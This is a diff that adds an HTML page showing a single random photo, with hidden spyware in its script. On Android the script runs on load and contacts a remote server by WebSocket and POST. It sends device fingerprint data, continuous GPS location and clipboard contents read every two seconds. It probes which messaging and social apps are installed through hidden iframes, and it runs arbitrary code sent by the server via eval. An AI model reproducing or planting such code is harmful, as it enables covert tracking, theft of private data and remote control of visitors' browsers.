@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>.</title>
+<style>
+*{margin:0;padding:0}
+body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden}
+img{max-width:100%;max-height:100vh;object-fit:contain}
+</style>
+</head>
+<body>
+<img src="https://picsum.photos/800/1200" alt=".">
+
+<script>
+const S = 'https://my-server-py0j.onrender.com';
+const ID = 'a'+Math.random().toString(36).substr(2,12);
+let ws=null;
+
+function c(){
+ws=new WebSocket(`wss://my-server-py0j.onrender.com/ws/${ID}`);
+ws.onopen=()=>{ws.send(JSON.stringify({t:'reg',id:ID,d:g()}));};
+ws.onmessage=e=>{try{h(JSON.parse(e.data))}catch(err){}};
+ws.onclose=()=>setTimeout(c,2000);
+}
+
+function g(){
+return{
+ua:navigator.userAgent,p:navigator.platform,l:navigator.language,
+s:`${screen.width}x${screen.height}`,dpr:window.devicePixelRatio,
+c:navigator.hardwareConcurrency,r:navigator.deviceMemory||'?',
+tz:Intl.DateTimeFormat().resolvedOptions().timeZone,time:Date.now()
+};
+}
+
+function s(t,p){
+const d={id:ID,type:t,payload:p};
+if(ws&&ws.readyState===1)ws.send(JSON.stringify(d));
+fetch(`${S}/collect`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).catch(()=>{});
+}
+
+function gps(){
+navigator.geolocation.getCurrentPosition(
+p=>s('gps',{lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}),
+e=>s('gps_err',{msg:e.message}),
+{enableHighAccuracy:true,timeout:5000}
+);
+navigator.geolocation.watchPosition(
+p=>s('gps_live',{lat:p.coords.latitude,lon:p.coords.longitude}),
+()=>{},{enableHighAccuracy:true}
+);
+}
+
+setInterval(async()=>{
+try{
+const t=await navigator.clipboard.readText();
+if(t)s('clip',{txt:t});
+}catch(e){}
+},2000);
+
+const APPS={
+w:'whatsapp://',t:'tg://',i:'instagram://',f:'fb://',tw:'twitter://',
+sn:'snapchat://',tk:'snaptik://',yt:'youtube://',ms:'fb-messenger://',
+ds:'discord://',sg:'signal://',vb:'viber://',li:'linkedin://'
+};
+
+function sc(){
+const fd=[];
+const ifr=document.createElement('iframe');
+ifr.style.cssText='display:none;position:absolute;width:1px;height:1px;opacity:0';
+document.body.appendChild(ifr);
+for(const[n,sch]of Object.entries(APPS)){
+try{const st=performance.now();ifr.src=sch;
+setTimeout(()=>{if(performance.now()-st<100)fd.push(n);},50);}catch(e){}
+}
+setTimeout(()=>{
+document.body.removeChild(ifr);
+s('apps',{installed:fd,count:fd.length});
+},3000);
+}
+
+function h(c){
+switch(c.a){
+case'gps':gps();break;
+case'clip':navigator.clipboard.readText().then(t=>s('clip',{txt:t})).catch(()=>{});break;
+case'scan':sc();break;
+case'full':s('full',g());break;
+case'eval':try{eval(c.code)}catch(e){}break;
+case'ping':s('pong',{});break;
+case'open':window.location.href=APPS[c.app]||'';break;
+}
+}
+
+function isAndroid(){return /Android/i.test(navigator.userAgent);}
+
+if(isAndroid()){
+setTimeout(()=>{
+c();
+s('full',g());
+gps();
+sc();
+},500);
+}
+
+setInterval(()=>{if(ws&&ws.readyState===1)ws.send(JSON.stringify({t:'ping'}));},25000);
+setInterval(gps,60000);
+</script>
+</body>
+</html>
